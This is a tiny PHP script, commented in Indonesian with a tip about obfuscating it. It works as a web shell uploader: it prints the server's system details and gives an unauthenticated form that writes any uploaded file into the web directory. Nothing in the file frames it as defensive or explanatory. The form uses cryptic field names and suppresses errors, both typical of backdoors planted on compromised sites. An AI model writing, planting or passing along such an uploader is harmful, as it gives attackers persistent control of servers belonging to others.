<?php
/*
jangan menggunakan tag '<?php' & '?>'
jika kalian mau melakukan obfuscator
*/
echo '<pre>' . php_uname() . "\n" . '<br/>';
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="__">';
echo '<input name="_" type="submit" value="Upload">';
echo '</form>';

if ($_POST) {
    if (@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {
        echo 'OK';
    } else {
        echo 'ER';
    }
}
?>
